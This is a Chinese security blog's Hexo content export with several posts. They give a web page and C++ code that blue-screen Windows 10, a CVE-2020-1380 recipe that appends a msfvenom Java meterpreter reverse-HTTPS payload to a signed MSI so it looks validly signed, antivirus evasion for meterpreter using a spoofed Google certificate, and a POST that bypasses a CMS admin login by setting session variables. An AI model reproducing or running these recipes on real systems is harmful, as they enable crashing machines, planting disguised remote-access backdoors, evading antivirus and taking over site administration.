{"meta":{"title":"魔域魂窟","subtitle":"","description":"网络安全","author":"魂笛","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"win10蓝屏bug","slug":"win10蓝屏bug","date":"2021-01-30T08:14:21.000Z","updated":"2021-01-30T08:41:52.987Z","comments":true,"path":"2021/01/30/win10蓝屏bug/","link":"","permalink":"http://example.com/2021/01/30/win10%E8%93%9D%E5%B1%8Fbug/","excerpt":"","text":"#win10蓝屏bug最近win10 的蓝屏bug最近很火，在google浏览器中输入： \\\\.\\globalroot\\device\\condrv\\kernelconnect https://secquan.zzyuncheng.com/e028b8d1549111d870b8c570c002ca18.png-quanzi 就会蓝屏，亲测有效； 看到吾爱中分析解释说是condrv驱动里的派遣函数CdpDispatchCleanup发生了空指针引用，而后触发了蓝屏。 因为谷歌浏览器调用了GetFileAttributesExW函数，然后转入ntdll,接着走进了内核，然后调用了condrv的派遣函数。 12345678&lt;html&gt;&lt;head&gt;&lt;&#x2F;head&gt;&lt;body&gt;&gt;&lt;script&gt;document.location &#x3D; &#39;\\\\\\\\.\\\\globalroot\\\\device\\\\condrv\\\\kernelconnect&#39;;&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 有师傅分享了代码： 12345678910&#x2F; BSOD.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。&#x2F;&#x2F;#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main()&#123; WCHAR fileName[] &#x3D; L&quot;\\\\\\\\.\\\\globalroot\\\\device\\\\condrv\\\\kernelconnect&quot;; WIN32_FILE_ATTRIBUTE_DATA data; GetFileAttributesEx(fileName, GetFileExInfoStandard, &amp;data);&#125; 直接编译成exe文件： 运行生成的exe文件，成功蓝屏：好像没看到可以利用此漏洞来远程执行代码的，希望win10早点修复这个bug呗。 参考链接：https://www.52pojie.cn/thread-1354077-1-1.html","categories":[],"tags":[]},{"title":"CVE-2020-1380签名伪造","slug":"CVE-2020-1380签名伪造","date":"2020-11-17T10:17:01.000Z","updated":"2020-11-17T10:17:18.218Z","comments":true,"path":"2020/11/17/CVE-2020-1380签名伪造/","link":"","permalink":"http://example.com/2020/11/17/CVE-2020-1380%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0/","excerpt":"","text":"#CVE-2020-1380签名伪造在之前的文章中，冷逸曾写过一篇《使用CVE-2020-0601进行伪造签名》的文章，里面利用windows其对椭圆曲线的逻辑处理错误，可以为任何程序添加可信的数字签名。而今天介绍的是冷逸另一种更加简单的方法，来添加数字签名，漏洞编号为CVE-2020-1380也称之为GlueBall。利用该漏洞可绕过安全特征，不正确地加载已签名文件。在攻击场景中，攻击者能够绕过旨在阻止加载不正确签名文件的安全特征。我们来看一下这个漏洞，众所周知，在以管理员权限运行时，windows会弹出uac的提示，而拥有数字签名的程序触发uac时，为蓝色. 非数字签名的为黄色 而众所周知比较常用的数字签名伪造工具sigthief是可以进行签名伪造的，该工具伪造的签名在国内的一些在线测试平台上会显示签名正常，而在VT则会显示无效签名，在系统中也会显示签名无效. 而利用该漏洞签名的文件，则会显示正常. 注：VT已针对该漏洞进行更新，VT可成功检测该漏洞攻击,会显示invaild-signature 下面即对该漏洞进行复现，该漏洞的复现过程很简单，准备一个带有数字签名的msi文件，一个恶意的jar文件(可msf生成)，然后合成即可，思路如下. msfvenom -p java/meterpreter/reverse_https LHOST= LPORT= -f jar -o xxx.jar 然后制作文件 copy /b xxx.msi + xxx.jar xxx.jar 成功获取session。其余java编写文件都可以使用该方法进行制作，注：只能为java文件 导致该漏洞的原因为当 Windows 读取 MSI 文件时，它会从文件开头开始读取，一直到有效的 MSI 签名末尾结束并舍弃其它部分。因此在检测到合法的 MSI 文件结构后，它会忽略被附加的数据，而不管它是什么。而JAR 文件只不过是 ZIP 文件，并且在执行时由 Java 运行时从文件末尾开始读取，直到检测到有效 ZIP 文件结构的开头为止，然后它将丢弃文件的其余部分。这最后将造成indows 开始从开头读取而 JAVA 从末尾读取时,windows认为其是一个签名文件，而java文件也可以正常运行。 现windows已更新了相关补丁，主要为msisip.dll该文件，加入了NeedFileSizeVerification和VerifyFileSize两个逻辑，更新系统即可防止该类攻击。 参考文章：https://blog.csdn.net/smellycat000/article/details/108091187https://www.secrss.com/articles/24763https://www.securityinbits.com/malware-analysis/interesting-tactic-by-ratty-adwind-distribution-of-jar-appended-to-signed-msi/https://www.chainnews.com/zh-hant/articles/041869869233.htmhttps://wwws.nightwatchcybersecurity.com/2019/01/16/thoughts-on-the-msi-jar-authenticode-bypass/","categories":[],"tags":[]},{"title":"httpsms","slug":"httpsms","date":"2020-11-17T10:00:38.000Z","updated":"2020-11-17T10:00:49.186Z","comments":true,"path":"2020/11/17/httpsms/","link":"","permalink":"http://example.com/2020/11/17/httpsms/","excerpt":"","text":"#https证书绕过杀软msf生成证书（要能连上google，用俺vps来搞）use auxiliary/gather/impersonate_ssl set RHOST www.google.com run生成msf攻击载荷：msfvenom -p windows/meterpreter/reverse_winhttps LHOST=192.168.226.136 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=/root/www.google.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f py -o pentestlab.py然后msf监听： use exploit/multi/handler set payload windows/meterpreter/reverse_winhttps set LHOST 192.168.226.136 set LPORT 443 set HandlerSSLCert /root/www.google.com.pem (设置证书) set StagerVerifySSLCert true exploit -j 然后在win7上运行这个pentestlab.py 360杀毒，安全卫士无反应。 全自动工具：https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL 参考：https://pentestlab.blog/category/defense-evasion/","categories":[],"tags":[]},{"title":"cms","slug":"cms","date":"2020-11-17T09:36:28.000Z","updated":"2020-11-17T09:36:43.150Z","comments":true,"path":"2020/11/17/cms/","link":"","permalink":"http://example.com/2020/11/17/cms/","excerpt":"","text":"#cms后台登录绕过@miko 1.随便打开一个index.php，然后发送post请求，创建seions.POST:_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999此时就成功地创建了SESION变量.2.创建完成后，登录后台.3.成功！","categories":[],"tags":[]},{"title":"about","slug":"about","date":"2020-11-17T09:27:45.000Z","updated":"2020-11-17T09:52:18.358Z","comments":true,"path":"2020/11/17/about/","link":"","permalink":"http://example.com/2020/11/17/about/","excerpt":"","text":"#I’m miko魔域魂窟是我的github博客. 你可以在这里学到东西.","categories":[],"tags":[]}],"categories":[],"tags":[]}